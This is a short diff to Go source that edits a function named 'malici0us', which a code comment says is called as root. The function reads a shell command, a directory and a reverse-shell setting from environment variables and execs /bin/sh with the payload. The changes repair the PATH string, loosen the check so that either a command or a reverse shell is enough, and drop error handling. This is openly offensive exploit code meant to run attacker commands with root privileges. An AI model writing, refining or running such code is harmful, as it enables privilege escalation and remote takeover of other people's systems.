@@ -11,7 +11,7 @@ import (
 	"time"
 )
 
-const path = "=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/bin"
+const path = "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/bin"
 
 /*
  * Malicious function called as root
@@ -22,7 +22,7 @@ func malici0us() {
 	payload, foundPayload := syscall.Getenv("COMMAND")
 	dir, foundDir := syscall.Getenv("PKDIR")
 	revShell, foundRevShell := syscall.Getenv("REV")
-	if !foundPayload || !foundDir || !foundRevShell {
+	if (!foundPayload && !foundRevShell) || !foundDir {
 		return
 	}
 
@@ -38,10 +38,7 @@ func malici0us() {
 	} else {
 		argv := []string{"/bin/sh", "-c", fmt.Sprintf("\"%s\"", payload)}
 		envv := []string{path}
-		err := syscall.Exec("/bin/sh", argv, envv)
-		if err != nil {
-			log.Fatalln(err)
-		}
+		syscall.Exec("/bin/sh", argv, envv)
 	}
 }
 
